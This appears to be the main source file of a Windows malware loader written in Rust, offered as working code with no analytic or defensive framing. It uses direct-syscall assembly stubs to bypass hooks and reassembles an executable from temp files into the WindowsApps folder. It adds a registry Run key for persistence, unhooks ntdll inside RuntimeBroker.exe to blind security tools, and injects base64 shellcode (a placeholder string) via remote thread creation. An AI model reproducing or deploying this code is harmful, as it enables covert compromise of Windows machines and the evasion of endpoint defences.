// main.rs

use std::mem;
use core::arch::global_asm;
use windows::{
    Win32::System::Diagnostics::ToolHelp::*,
    Win32::Foundation::*,
};
use windows_sys::Win32::System::Threading::{PROCESS_ALL_ACCESS, PROCESS_BASIC_INFORMATION, ProcessBasicInformation};
use windows_sys::Win32::System::WindowsProgramming::{CLIENT_ID, OBJECT_ATTRIBUTES};
use windows_sys::Win32::System::Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE};
use windows_sys::Win32::Foundation::{HANDLE, NTSTATUS};
use windows_sys::Win32::Storage::FileSystem::{
    FILE_GENERIC_READ, FILE_GENERIC_WRITE, FILE_SHARE_READ, FILE_OPEN, FILE_OVERWRITE_IF,
};
use windows_sys::Win32::Security::{TOKEN_QUERY, TokenUser, TOKEN_USER};
use windows_sys::Win32::Security::Authorization::ConvertSidToStringSidW;
use windows_sys::Win32::System::SystemServices::{IMAGE_DOS_HEADER};
use windows_sys::Win32::System::Diagnostics::Debug::{IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER};
use base64::{Engine as _, engine::general_purpose};

mod syscall;

global_asm!(r#"
.global asm_nt_open_process
asm_nt_open_process:
    mov r10, rcx
    mov eax, [rsp + 0x28]
    syscall
    ret

.global asm_nt_allocate_virtual_memory
asm_nt_allocate_virtual_memory:
    mov r10, rcx
    mov eax, [rsp + 0x38]
    syscall
    ret

.global asm_nt_write_virtual_memory
asm_nt_write_virtual_memory:
    mov r10, rcx
    mov eax, [rsp + 0x30]
    syscall
    ret

.global asm_nt_create_thread_ex
asm_nt_create_thread_ex:
    mov r10, rcx
    mov eax, [rsp + 0x60]
    syscall
    ret

.global asm_nt_close
asm_nt_close:
    mov r10, rcx
    mov eax, edx
    syscall
    ret

.global asm_nt_protect_virtual_memory
asm_nt_protect_virtual_memory:
    mov r10, rcx
    mov eax, [rsp + 0x30]
    syscall
    ret

.global asm_nt_read_virtual_memory
asm_nt_read_virtual_memory:
    mov r10, rcx
    mov eax, [rsp + 0x30]
    syscall
    ret

.global asm_nt_query_information_process
asm_nt_query_information_process:
    mov r10, rcx
    mov eax, [rsp + 0x30]
    syscall
    ret

.global asm_nt_create_file
asm_nt_create_file:
    mov r10, rcx
    mov eax, [rsp + 0x60]
    syscall
    ret

.global asm_nt_read_file
asm_nt_read_file:
    mov r10, rcx
    mov eax, [rsp + 0x50]
    syscall
    ret

.global asm_nt_write_file
asm_nt_write_file:
    mov r10, rcx
    mov eax, [rsp + 0x50]
    syscall
    ret

.global asm_nt_open_process_token
asm_nt_open_process_token:
    mov r10, rcx
    mov eax, r9d
    syscall
    ret

.global asm_nt_query_information_token
asm_nt_query_information_token:
    mov r10, rcx
    mov eax, [rsp + 0x30]
    syscall
    ret

.global asm_nt_open_key
asm_nt_open_key:
    mov r10, rcx
    mov eax, r9d
    syscall
    ret

.global asm_nt_set_value_key
asm_nt_set_value_key:
    mov r10, rcx
    mov eax, [rsp + 0x38]
    syscall
    ret
"#);

#[repr(C)]
#[allow(non_snake_case)]
pub struct IO_STATUS_BLOCK {
    pub Anonymous: IO_STATUS_BLOCK_0,
    pub Information: usize,
}

#[repr(C)]
#[allow(non_snake_case)]
pub union IO_STATUS_BLOCK_0 {
    pub Status: NTSTATUS,
    pub Pointer: *mut std::ffi::c_void,
}

#[repr(C)]
#[allow(non_snake_case)]
pub struct UNICODE_STRING {
    pub Length: u16,
    pub MaximumLength: u16,
    pub Buffer: *mut u16,
}

extern "C" {
    fn asm_nt_open_process(ProcessHandle: &mut HANDLE, DesiredAccess: u32, ObjectAttributes: &mut OBJECT_ATTRIBUTES, ClientId: &mut CLIENT_ID, syscall_id: u32) -> NTSTATUS;
    fn asm_nt_allocate_virtual_memory(ProcessHandle: HANDLE, BaseAddress: &mut *mut std::ffi::c_void, ZeroBits: u32, RegionSize: &mut usize, AllocationType: u32, Protect: u32, syscall_id: u32) -> NTSTATUS;
    fn asm_nt_write_virtual_memory(ProcessHandle: HANDLE, BaseAddress: *mut std::ffi::c_void, Buffer: *const std::ffi::c_void, NumberOfBytesToWrite: usize, NumberOfBytesWritten: &mut usize, syscall_id: u32) -> NTSTATUS;
    fn asm_nt_create_thread_ex(ThreadHandle: &mut HANDLE, DesiredAccess: u32, ObjectAttributes: *mut OBJECT_ATTRIBUTES, ProcessHandle: HANDLE, StartRoutine: *mut std::ffi::c_void, Argument: *mut std::ffi::c_void, CreateFlags: u32, ZeroBits: usize, StackSize: usize, MaximumStackSize: usize, AttributeList: *mut std::ffi::c_void, syscall_id: u32) -> NTSTATUS;
    fn asm_nt_close(Handle: HANDLE, syscall_id: u32) -> NTSTATUS;
    fn asm_nt_protect_virtual_memory(ProcessHandle: HANDLE, BaseAddress: &mut *mut std::ffi::c_void, NumberOfBytesToProtect: &mut usize, NewProperty: u32, OldProperty: &mut u32, syscall_id: u32) -> NTSTATUS;
    fn asm_nt_read_virtual_memory(ProcessHandle: HANDLE, BaseAddress: *const std::ffi::c_void, Buffer: *mut std::ffi::c_void, NumberOfBytesToRead: usize, NumberOfBytesRead: &mut usize, syscall_id: u32) -> NTSTATUS;
    fn asm_nt_query_information_process(ProcessHandle: HANDLE, ProcessInformationClass: u32, ProcessInformation: *mut std::ffi::c_void, ProcessInformationLength: u32, ReturnLength: &mut u32, syscall_id: u32) -> NTSTATUS;
    fn asm_nt_create_file(FileHandle: &mut HANDLE, DesiredAccess: u32, ObjectAttributes: &mut OBJECT_ATTRIBUTES, IoStatusBlock: &mut IO_STATUS_BLOCK, AllocationSize: *mut i64, FileAttributes: u32, ShareAccess: u32, CreateDisposition: u32, CreateOptions: u32, EaBuffer: *mut std::ffi::c_void, EaLength: u32, syscall_id: u32) -> NTSTATUS;
    fn asm_nt_read_file(FileHandle: HANDLE, Event: HANDLE, ApcRoutine: *mut std::ffi::c_void, ApcContext: *mut std::ffi::c_void, IoStatusBlock: &mut IO_STATUS_BLOCK, Buffer: *mut std::ffi::c_void, Length: u32, ByteOffset: *mut i64, Key: *mut u32, syscall_id: u32) -> NTSTATUS;
    fn asm_nt_write_file(FileHandle: HANDLE, Event: HANDLE, ApcRoutine: *mut std::ffi::c_void, ApcContext: *mut std::ffi::c_void, IoStatusBlock: &mut IO_STATUS_BLOCK, Buffer: *const std::ffi::c_void, Length: u32, ByteOffset: *mut i64, Key: *mut u32, syscall_id: u32) -> NTSTATUS;
    fn asm_nt_open_process_token(ProcessHandle: HANDLE, DesiredAccess: u32, TokenHandle: &mut HANDLE, syscall_id: u32) -> NTSTATUS;
    fn asm_nt_query_information_token(TokenHandle: HANDLE, TokenInformationClass: u32, TokenInformation: *mut std::ffi::c_void, TokenInformationLength: u32, ReturnLength: &mut u32, syscall_id: u32) -> NTSTATUS;
    fn asm_nt_open_key(KeyHandle: &mut HANDLE, DesiredAccess: u32, ObjectAttributes: &mut OBJECT_ATTRIBUTES, syscall_id: u32) -> NTSTATUS;
    fn asm_nt_set_value_key(KeyHandle: HANDLE, ValueName: &mut UNICODE_STRING, TitleIndex: u32, Type: u32, Data: *const std::ffi::c_void, DataSize: u32, syscall_id: u32) -> NTSTATUS;
}

fn merge_and_copy_payload() {
    let temp_dir = std::env::var("TEMP").unwrap_or_else(|_| "C:\\Windows\\Temp".to_string());
    let local_app_data = std::env::var("LOCALAPPDATA").unwrap_or_default();

    if local_app_data.is_empty() { return; }

    let files = [
        format!("{}\\{}", temp_dir, "1.tmp"),
        format!("{}\\{}", temp_dir, "2.tmp"),
        format!("{}\\{}", temp_dir, "3.tmp"),
    ];
    let reconstructed = format!("{}\\{}", temp_dir, "reconstructed.exe");
    let destination = format!("{}\\Microsoft\\WindowsApps\\reconstructed.exe", local_app_data);

    let nt_create_file_id = syscall::get_syscall_number("NtCreateFile").unwrap();
    let nt_read_file_id = syscall::get_syscall_number("NtReadFile").unwrap();
    let nt_write_file_id = syscall::get_syscall_number("NtWriteFile").unwrap();
    let nt_close_id = syscall::get_syscall_number("NtClose").unwrap();

    unsafe {
        let mut h_out = 0;
        if nt_open_create_file(&mut h_out, &reconstructed, FILE_GENERIC_WRITE, FILE_OVERWRITE_IF, nt_create_file_id) {
            for f in &files {
                let mut h_in = 0;
                if nt_open_create_file(&mut h_in, f, FILE_GENERIC_READ, FILE_OPEN, nt_create_file_id) {
                    copy_data(h_in, h_out, nt_read_file_id, nt_write_file_id);
                    asm_nt_close(h_in, nt_close_id);
                }
            }
            asm_nt_close(h_out, nt_close_id);
        }

        let mut h_src = 0;
        let mut h_dst = 0;
        if nt_open_create_file(&mut h_src, &reconstructed, FILE_GENERIC_READ, FILE_OPEN, nt_create_file_id) {
            if nt_open_create_file(&mut h_dst, &destination, FILE_GENERIC_WRITE, FILE_OVERWRITE_IF, nt_create_file_id) {
                copy_data(h_src, h_dst, nt_read_file_id, nt_write_file_id);
                asm_nt_close(h_dst, nt_close_id);
            }
            asm_nt_close(h_src, nt_close_id);
        }
    }
}

unsafe fn nt_open_create_file(handle: &mut HANDLE, path: &str, access: u32, disposition: u32, syscall_id: u32) -> bool {
    let mut nt_path: Vec<u16> = "\\??\\".encode_utf16().collect();
    nt_path.extend(path.encode_utf16());
    nt_path.push(0);

    let mut us = UNICODE_STRING {
        Length: ((nt_path.len() - 1) * 2) as u16,
        MaximumLength: (nt_path.len() * 2) as u16,
        Buffer: nt_path.as_mut_ptr(),
    };

    let mut obj_attr: OBJECT_ATTRIBUTES = mem::zeroed();
    obj_attr.Length = mem::size_of::<OBJECT_ATTRIBUTES>() as u32;
    obj_attr.ObjectName = &mut us as *mut _ as *mut _;
    obj_attr.Attributes = 0x00000040; // OBJ_CASE_INSENSITIVE

    let mut io_status: IO_STATUS_BLOCK = mem::zeroed();

    let status = asm_nt_create_file(
        handle,
        access | 0x00100000, // SYNCHRONIZE
        &mut obj_attr,
        &mut io_status,
        std::ptr::null_mut(),
        0,
        FILE_SHARE_READ,
        disposition,
        0x00000020 | 0x00000040, // FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE
        std::ptr::null_mut(),
        0,
        syscall_id,
    );

    status == 0
}

unsafe fn copy_data(h_in: HANDLE, h_out: HANDLE, read_id: u32, write_id: u32) {
    let mut buffer = [0u8; 8192];
    loop {
        let mut io_status_read: IO_STATUS_BLOCK = mem::zeroed();
        let status = asm_nt_read_file(
            h_in,
            0,
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            &mut io_status_read,
            buffer.as_mut_ptr() as *mut _,
            buffer.len() as u32,
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            read_id,
        );

        if status != 0 || io_status_read.Information == 0 {
            break;
        }

        let mut io_status_write: IO_STATUS_BLOCK = mem::zeroed();
        asm_nt_write_file(
            h_out,
            0,
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            &mut io_status_write,
            buffer.as_ptr() as *const _,
            io_status_read.Information as u32,
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            write_id,
        );
    }
}

fn add_persistence_key() {
    let sid_string = get_current_user_sid_string().unwrap_or_default();
    if sid_string.is_empty() { return; }

    let nt_open_key_id = syscall::get_syscall_number("NtOpenKey").unwrap();
    let nt_set_value_key_id = syscall::get_syscall_number("NtSetValueKey").unwrap();
    let nt_close_id = syscall::get_syscall_number("NtClose").unwrap();

    let registry_path = format!("\\Registry\\User\\{}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", sid_string);
    let mut nt_path: Vec<u16> = registry_path.encode_utf16().collect();
    nt_path.push(0);

    unsafe {
        let mut us_path = UNICODE_STRING {
            Length: ((nt_path.len() - 1) * 2) as u16,
            MaximumLength: (nt_path.len() * 2) as u16,
            Buffer: nt_path.as_mut_ptr(),
        };

        let mut obj_attr: OBJECT_ATTRIBUTES = mem::zeroed();
        obj_attr.Length = mem::size_of::<OBJECT_ATTRIBUTES>() as u32;
        obj_attr.ObjectName = &mut us_path as *mut _ as *mut _;
        obj_attr.Attributes = 0x00000040; // OBJ_CASE_INSENSITIVE

        let mut h_key = 0;
        let status = asm_nt_open_key(&mut h_key, 0x000F003F, &mut obj_attr, nt_open_key_id); // KEY_ALL_ACCESS

        if status == 0 {
            let mut val_name: Vec<u16> = "reconstructed".encode_utf16().collect();
            val_name.push(0);
            let mut us_val = UNICODE_STRING {
                Length: ((val_name.len() - 1) * 2) as u16,
                MaximumLength: (val_name.len() * 2) as u16,
                Buffer: val_name.as_mut_ptr(),
            };

            let mut data: Vec<u16> = "reconstructed".encode_utf16().collect();
            data.push(0);

            asm_nt_set_value_key(
                h_key,
                &mut us_val,
                0,
                1, // REG_SZ
                data.as_ptr() as *const _,
                (data.len() * 2) as u32,
                nt_set_value_key_id,
            );

            asm_nt_close(h_key, nt_close_id);
        }
    }
}

fn get_current_user_sid_string() -> Option<String> {
    let nt_open_token_id = syscall::get_syscall_number("NtOpenProcessToken")?;
    let nt_query_token_id = syscall::get_syscall_number("NtQueryInformationToken")?;
    let nt_close_id = syscall::get_syscall_number("NtClose")?;

    unsafe {
        let mut h_token = 0;
        let status = asm_nt_open_process_token(!0, TOKEN_QUERY, &mut h_token, nt_open_token_id);
        if status != 0 { return None; }

        let mut len = 0;
        asm_nt_query_information_token(h_token, TokenUser as u32, std::ptr::null_mut(), 0, &mut len, nt_query_token_id);

        let mut buffer = vec![0u8; len as usize];
        let status = asm_nt_query_information_token(
            h_token,
            TokenUser as u32,
            buffer.as_mut_ptr() as *mut _,
            len,
            &mut len,
            nt_query_token_id
        );

        asm_nt_close(h_token, nt_close_id);

        if status != 0 { return None; }

        let token_user = &*(buffer.as_ptr() as *const TOKEN_USER);
        let mut sid_ptr = std::ptr::null_mut();
        if ConvertSidToStringSidW(token_user.User.Sid, &mut sid_ptr) != 0 {
            let len = (0..).find(|&i| *sid_ptr.add(i) == 0).unwrap();
            let sid_slice = std::slice::from_raw_parts(sid_ptr, len);
            let sid_str = String::from_utf16_lossy(sid_slice);
            windows_sys::Win32::System::Memory::LocalFree(sid_ptr as _);
            return Some(sid_str);
        }
    }

    None
}

const SHELLCODE: &str = "Sh_replace";

fn get_module_base_address(process_handle: HANDLE, module_name: &str) -> Option<usize> {
    let mut pbi: PROCESS_BASIC_INFORMATION = unsafe { mem::zeroed() };
    let mut return_len = 0;
    let nt_query_info_syscall = syscall::get_syscall_number("NtQueryInformationProcess")?;
    let nt_read_mem_syscall = syscall::get_syscall_number("NtReadVirtualMemory")?;

    let status = unsafe {
        asm_nt_query_information_process(
            process_handle,
            ProcessBasicInformation as u32,
            &mut pbi as *mut _ as *mut _,
            mem::size_of::<PROCESS_BASIC_INFORMATION>() as u32,
            &mut return_len,
            nt_query_info_syscall,
        )
    };

    if status != 0 { return None; }

    let peb_base = pbi.PebBaseAddress;
    let mut ldr_ptr: *mut std::ffi::c_void = std::ptr::null_mut();
    let mut bytes_read = 0;

    unsafe {
        asm_nt_read_virtual_memory(
            process_handle,
            (peb_base as usize + 0x18) as *const _,
            &mut ldr_ptr as *mut _ as *mut _,
            mem::size_of::<*mut std::ffi::c_void>(),
            &mut bytes_read,
            nt_read_mem_syscall,
        );
    }

    let mut list_head = [0usize; 2];
    unsafe {
        asm_nt_read_virtual_memory(
            process_handle,
            (ldr_ptr as usize + 0x10) as *const _,
            list_head.as_mut_ptr() as *mut _,
            mem::size_of::<[usize; 2]>(),
            &mut bytes_read,
            nt_read_mem_syscall,
        );
    }

    let mut current_node = list_head[0];
    while current_node != (ldr_ptr as usize + 0x10) {
        let mut dll_base = 0usize;
        unsafe {
            asm_nt_read_virtual_memory(
                process_handle,
                (current_node + 0x30) as *const _,
                &mut dll_base as *mut _ as *mut _,
                mem::size_of::<usize>(),
                &mut bytes_read,
                nt_read_mem_syscall,
            );
        }

        let mut base_name_ptr = 0usize;
        let mut base_name_len = 0u16;
        unsafe {
            asm_nt_read_virtual_memory(
                process_handle,
                (current_node + 0x58) as *const _,
                &mut base_name_len as *mut _ as *mut _,
                2,
                &mut bytes_read,
                nt_read_mem_syscall,
            );
            asm_nt_read_virtual_memory(
                process_handle,
                (current_node + 0x60) as *const _,
                &mut base_name_ptr as *mut _ as *mut _,
                mem::size_of::<usize>(),
                &mut bytes_read,
                nt_read_mem_syscall,
            );
        }

        let mut name_bytes = vec![0u16; (base_name_len / 2) as usize];
        unsafe {
            asm_nt_read_virtual_memory(
                process_handle,
                base_name_ptr as *const _,
                name_bytes.as_mut_ptr() as *mut _,
                base_name_len as usize,
                &mut bytes_read,
                nt_read_mem_syscall,
            );
        }

        let current_module_name = String::from_utf16_lossy(&name_bytes);
        if current_module_name.eq_ignore_ascii_case(module_name) {
            return Some(dll_base);
        }

        unsafe {
            asm_nt_read_virtual_memory(
                process_handle,
                current_node as *const _,
                &mut current_node as *mut _ as *mut _,
                mem::size_of::<usize>(),
                &mut bytes_read,
                nt_read_mem_syscall,
            );
        }
    }

    None
}

fn unhook_remote_ntdll(process_handle: HANDLE, remote_base: usize) {
    let ntdll_bytes = std::fs::read("C:\\Windows\\System32\\ntdll.dll").expect("Failed to read ntdll.dll");
    let dos_header = ntdll_bytes.as_ptr() as *const IMAGE_DOS_HEADER;
    let nt_headers = unsafe { (ntdll_bytes.as_ptr() as usize + (*dos_header).e_lfanew as usize) as *const IMAGE_NT_HEADERS64 };
    let section_header = (nt_headers as usize + mem::size_of::<IMAGE_NT_HEADERS64>()) as *const IMAGE_SECTION_HEADER;
    let num_sections = unsafe { (*nt_headers).FileHeader.NumberOfSections };

    for i in 0..num_sections {
        let section = unsafe { *section_header.add(i as usize) };
        let name_bytes = &section.Name;
        let name = std::str::from_utf8(name_bytes).unwrap_or("").trim_matches('\0');

        if name == ".text" {
            let virtual_address = section.VirtualAddress as usize;
            let size_of_raw_data = section.SizeOfRawData as usize;
            let pointer_to_raw_data = section.PointerToRawData as usize;

            let clean_text = &ntdll_bytes[pointer_to_raw_data..pointer_to_raw_data + size_of_raw_data];
            let remote_text_addr = remote_base + virtual_address;

            let nt_protect_syscall = syscall::get_syscall_number("NtProtectVirtualMemory").expect("Syscall not found");
            let nt_write_syscall = syscall::get_syscall_number("NtWriteVirtualMemory").expect("Syscall not found");

            let mut old_protect = 0u32;
            let mut protect_addr = remote_text_addr as *mut std::ffi::c_void;
            let mut protect_size = size_of_raw_data;

            unsafe {
                asm_nt_protect_virtual_memory(
                    process_handle,
                    &mut protect_addr,
                    &mut protect_size,
                    PAGE_EXECUTE_READWRITE,
                    &mut old_protect,
                    nt_protect_syscall,
                );

                let mut bytes_written = 0;
                asm_nt_write_virtual_memory(
                    process_handle,
                    remote_text_addr as *mut std::ffi::c_void,
                    clean_text.as_ptr() as *const _,
                    size_of_raw_data,
                    &mut bytes_written,
                    nt_write_syscall,
                );

                asm_nt_protect_virtual_memory(
                    process_handle,
                    &mut protect_addr,
                    &mut protect_size,
                    old_protect,
                    &mut old_protect,
                    nt_protect_syscall,
                );
            }
            break;
        }
    }
}

fn get_process_pid() -> Option<u32> {
    unsafe {
        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0).unwrap();
        if snapshot.is_invalid() {
            return None;
        }

        let mut process_entry: PROCESSENTRY32 = mem::zeroed();
        process_entry.dwSize = mem::size_of::<PROCESSENTRY32>() as u32;

        if Process32First(snapshot, &mut process_entry).as_bool() {
            loop {
                let end = process_entry.szExeFile.iter().position(|&c| c == 0).unwrap_or(260);
                let bytes = std::slice::from_raw_parts(process_entry.szExeFile.as_ptr() as *const u8, end);
                let process_name = String::from_utf8_lossy(bytes);
                if process_name == "RuntimeBroker.exe" {
                    CloseHandle(snapshot);
                    return Some(process_entry.th32ProcessID);
                }

                if !Process32Next(snapshot, &mut process_entry).as_bool() {
                    break;
                }
            }
        }
        CloseHandle(snapshot);
    }
    None
}

fn main() {
    merge_and_copy_payload();
    add_persistence_key();

    let target_pid = get_process_pid().expect("Process not found");
    let shellcode = general_purpose::STANDARD.decode(SHELLCODE).expect("Invalid shellcode");

    let mut process_handle: HANDLE = 0;
    let mut object_attributes: OBJECT_ATTRIBUTES = unsafe { mem::zeroed() };
    let mut client_id: CLIENT_ID = unsafe { mem::zeroed() };
    client_id.UniqueProcess = target_pid as _;

    let nt_open_process_syscall = syscall::get_syscall_number("NtOpenProcess").expect("Syscall not found");

    let status = unsafe {
        asm_nt_open_process(
            &mut process_handle,
            PROCESS_ALL_ACCESS,
            &mut object_attributes,
            &mut client_id,
            nt_open_process_syscall,
        )
    };

    if status != 0 { return; }

    if let Some(ntdll_base) = get_module_base_address(process_handle, "ntdll.dll") {
        unhook_remote_ntdll(process_handle, ntdll_base);
    }

    let mut alloc_addr: *mut std::ffi::c_void = std::ptr::null_mut();
    let mut size = shellcode.len();
    let nt_allocate_virtual_memory_syscall = syscall::get_syscall_number("NtAllocateVirtualMemory").expect("Syscall not found");

    let status = unsafe {
        asm_nt_allocate_virtual_memory(
            process_handle,
            &mut alloc_addr,
            0,
            &mut size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
            nt_allocate_virtual_memory_syscall,
        )
    };

    if status != 0 { return; }

    let mut bytes_written = 0;
    let nt_write_virtual_memory_syscall = syscall::get_syscall_number("NtWriteVirtualMemory").expect("Syscall not found");

    let status = unsafe {
        asm_nt_write_virtual_memory(
            process_handle,
            alloc_addr,
            shellcode.as_ptr() as *const _,
            shellcode.len(),
            &mut bytes_written,
            nt_write_virtual_memory_syscall,
        )
    };

    if status != 0 { return; }

    let mut thread_handle: HANDLE = 0;
    let nt_create_thread_ex_syscall = syscall::get_syscall_number("NtCreateThreadEx").expect("Syscall not found");

    let status = unsafe {
        asm_nt_create_thread_ex(
            &mut thread_handle,
            PROCESS_ALL_ACCESS,
            std::ptr::null_mut(),
            process_handle,
            alloc_addr,
            std::ptr::null_mut(),
            0,
            0,
            0,
            0,
            std::ptr::null_mut(),
            nt_create_thread_ex_syscall,
        )
    };

    if status != 0 { return; }

    let nt_close_syscall = syscall::get_syscall_number("NtClose").expect("Syscall not found");

    unsafe {
        asm_nt_close(thread_handle, nt_close_syscall);
        asm_nt_close(process_handle, nt_close_syscall);
    }
}
